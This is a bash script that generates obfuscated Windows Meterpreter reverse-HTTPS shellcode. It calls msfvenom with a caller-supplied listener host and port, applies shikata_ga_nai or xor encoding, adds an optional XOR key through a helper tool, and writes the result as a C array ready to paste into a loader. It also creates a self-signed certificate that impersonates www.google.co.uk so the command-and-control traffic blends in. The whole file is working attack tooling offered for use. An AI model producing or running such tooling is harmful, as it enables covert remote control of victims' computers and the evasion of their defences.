#!/bin/bash

arch=""
varSRC=""
host=""
port=""
XOR_Key=""
fpos="1337"
lpos="50000"

ssl_cert() {

    local host_url="www.google"
    local country="co.uk"
    local city="London"

    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=UK/ST=${city}/L=${city}/O=Development/CN=${host_url}.${country}" -keyout ${host_url}.${country}.key -out ${host_url}.${country}.crt
    cat ${host_url}.${country}.key ${host_url}.${country}.crt | dd of=/tmp/openssl_cert.pem >/dev/null 2>&1
    rm ${host_url}.${country}.key ${host_url}.${country}.crt

}

usage() {

    echo -en "\nUsage: $(basename "$0") -a <target arch> -h <host listener> -p <listen port : ${fpos} - ${lpos}> [opt][-v <varname> -k <xor key>]\n"
    exit 1

}

while getopts ":a:h:p:k:v:" opt; do
    case ${opt} in
        a)
            arch="$OPTARG"

            if [[ "${arch}" == "x64" ]];then 

                payload="windows/x64/meterpreter/reverse_https"

            elif [[ "${arch}" == "x86" ]];then

                payload="windows/meterpreter/reverse_https"

            else

                echo -en "\nThe arch ${arch} not recognized. The usables arch are : x86 and x64"
                exit

            fi
            ;;

        h)
            host="$OPTARG"
            ;;
        p)

            port="$OPTARG"

            if [[ "${port}" -le ${fpos} || "${port}" -ge ${lpos} ]];then

                echo -en "\nThe port value ${port} isn't valid. The usable range is ${fpos} to ${lpos}"
                exit

            fi
            ;;
        v)
            varSRC="$OPTARG"
            ;;
        k)
            XOR_Key="$OPTARG"
            ;;
        \?)
            echo -en "\nInvalid switch: -$OPTARG\n" 1>&2
            usage
            ;;
        :)
            echo -en "\nThe switch -$OPTARG needs an argument.\n" 1>&2
            usage
            ;;
    esac
done
shift $((OPTIND -1))

if [[ -z "${arch}" || -z "${host}" || -z "${port}" ]]; then

    usage

elif [[ ! -x "$(command -v textioconv)" ]];then 

    echo -en "\nThis script is meant to be used with textioconv..."
    exit

else 

    src_code="toPaste.txt"
    bkdoorcrt="/tmp/openssl_cert.pem"
    tmpmsf="/tmp/msf.txt"
    OS="windows"

    [[ -z ${varSRC} ]] && varSRC=encrypted_txt 
    [[ ! -f ${bkdoorcrt} ]] && ssl_cert >/dev/null 2>&1
    [[ -f ${src_code} ]] && rm ${src_code}
    [[ -f ${tmpmsf} ]] && rm ${tmpmsf}

    if [[ "${arch}" == "x86" ]];then

        eX86="x86/shikata_ga_nai"
        msfvenom -p "${payload}" --smallest --platform ${OS} -a "${arch}" -e "${eX86}" -b "\x00" -i 0 LHOST="${host}" LPORT="${port}" StagerVerifySSLCert=true HandlerSSLCert=${bkdoorcrt} -f c -o ${tmpmsf}

    else

        eX64="x64/xor"
        msfvenom -p "${payload}" --smallest --platform ${OS} -a "${arch}" -e "${eX64}" -i 0 LHOST="${host}" LPORT="${port}" StagerVerifySSLCert=true HandlerSSLCert=${bkdoorcrt} -f c -o ${tmpmsf}

    fi

    hexShell=$(sed -z 's|unsigned char buf\[\]||;s|[\\x\x0A\x1B\x20\x22\x3B\x3D]||g' ${tmpmsf})

    if [[ -n "${XOR_Key}" ]];then

        ocShellCode=$(textioconv -s "${hexShell}" -x "${XOR_Key}")

    else

        ocShellCode=$(textioconv -s "${hexShell}")

    fi

    if [[ -n ${ocShellCode} ]];then 

        sh_size=$(echo ${ocShellCode} | tr ',' ' ' | wc -w)
        ((sh_size+=1))
        echo "unsigned char ${varSRC}[${sh_size}] = {${ocShellCode}, 0000};" | dd of=${src_code} >/dev/null 2>&1
        echo -en "\nThe shellcode has been written in the txt file ${src_code}."
        [[ -n ${XOR_Key} ]] && echo -en "\nThe xor key is : ${XOR_Key}" || echo -en "\nThe xor key is : MySecretKey"

    else

        echo "the array has been not generated."

    fi
   
fi
